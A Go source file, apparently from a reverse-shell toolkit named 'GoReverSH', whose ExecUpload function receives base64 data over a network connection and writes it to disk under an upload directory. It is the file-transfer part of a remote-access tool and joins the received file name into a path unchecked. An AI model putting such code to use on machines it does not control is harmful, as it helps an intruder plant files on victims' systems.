package pkgclient

import (
	"GoReverSH/config"
	"GoReverSH/utils"
	"encoding/base64"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
)

func ExecUpload(fileName string, conn net.Conn) error {
	//filePath := strings.Split(commands[len(commands)-1], "/")
	//fileName := commands[len(commands)-1]
	filePath := strings.Split(fileName, "/")
	lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
	//dir := "upload/"
	dir := config.Config.UploadDIr
	if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
		if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
			log.Fatalf("Could not create the path %s", dir)
		}
	}

	content, err := utils.RRead(conn)
	if err != nil {
		log.Println(err)
		return err
	}

	//save
	src := filepath.Join(dir, fileName)
	file, err := os.Create(src)
	if err != nil {
		log.Println(err)
		return err
	}
	base64ToData, err := base64.StdEncoding.DecodeString(string(content))
	_, err = file.Write(base64ToData)
	if err != nil {
		file.Close()
		return err
	}
	err = file.Close()
	if err != nil {
		return err
	}

	return nil
}
